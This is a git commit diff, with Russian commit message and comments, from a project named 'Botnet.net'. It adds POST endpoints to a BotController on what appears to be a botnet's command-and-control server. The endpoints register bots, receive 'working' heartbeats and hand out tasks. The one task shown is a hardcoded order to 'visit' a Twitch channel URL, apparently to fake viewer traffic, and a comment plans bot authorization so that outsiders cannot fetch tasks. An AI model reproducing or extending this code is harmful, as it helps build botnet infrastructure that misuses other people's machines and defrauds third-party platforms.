37cc7e07e9650b14c085e5e133ae855d0dfe4b76
Alek97 <petrovskii097@gmail.com>
2016-02-03 22:27:13 +0300

    Добавлено действия контроллера IsWorking в BotController отклик бота о том что он работает поступают туда

--- Botnet.net/Server/Controllers/BotController.cs
+++ Botnet.net/Server/Controllers/BotController.cs
@@ -13,17 +13,25 @@ namespace Server.Controllers
             Так же думаю что нужно использовать авторизацию бота, чтобы если кто-то пронюхал как отправить запрос, то не смог бы получить ответ с заданием.
         */
         // GET: Bot
-        public string GetTask()
+        [HttpPost]
+        public string GetTask(Guid id)
         {
             return "visit;http://www.twitch.tv/kanalkarnaval;0:1:0"; //Потому что нам не нужен только текст, а не html документ
         }
+        [HttpPost]
         public string Update(string version)
         {
             return string.Empty;//Возвращает пустую строку.
         }
+        [HttpPost]
         public string Registr(Guid id)
         {
             return string.Empty;//Возвращает пустую строку.
+        }
+        [HttpPost]
+        public string Working(Guid id)// отклик что бот работает поступают сюда
+        {
+            return string.Empty;
         }
     }
 }
